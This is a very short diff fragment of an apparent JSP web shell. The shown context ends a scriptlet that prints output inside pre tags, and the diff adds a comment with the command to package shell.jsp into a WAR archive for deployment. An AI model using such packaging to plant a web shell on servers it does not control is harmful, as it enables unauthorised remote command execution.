@@ -10,4 +10,5 @@
     }
     out.print("</pre>");
 }
+//jar cvf shell.war .\shell.jsp
 %>
